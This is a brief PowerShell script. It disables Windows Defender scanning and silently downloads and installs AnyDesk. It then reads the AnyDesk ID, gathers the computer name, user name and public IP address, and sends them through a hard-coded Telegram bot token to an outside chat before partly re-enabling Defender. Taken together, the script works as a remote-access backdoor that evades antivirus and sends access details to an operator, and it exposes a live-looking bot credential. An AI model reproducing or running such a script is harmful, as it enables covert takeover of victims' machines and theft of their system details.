# Disable Defender Temporarily
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true

# Install AnyDesk Silently
$anydeskUrl = "https://download.anydesk.com/AnyDesk.exe"
$anydeskPath = "$env:TEMP\AnyDesk.exe"
(New-Object System.Net.WebClient).DownloadFile($anydeskUrl, $anydeskPath)
Start-Process -FilePath $anydeskPath -ArgumentList "--silent --install" -Wait

# Get AnyDesk ID
Start-Sleep -Seconds 10
$anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id

# Send Telegram Alert
$BOT_TOKEN = "8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw"
$CHAT_ID = "1361241039"
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$time = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
$ipAddress = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()

$message = "🚨 Laptop Accessed!`n`n💻 Computer: $computerName`n👤 User: $userName`n🌐 IP: $ipAddress`n⏰ Time: $time`n🔗 AnyDesk ID: $anydeskId"
Invoke-WebRequest -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$message" -UseBasicParsing

# Create Log File
"$time - $computerName - $userName - $ipAddress - AnyDesk: $anydeskId" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append

# Re-enable Defender (Optional)
Start-Sleep -Seconds 30
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
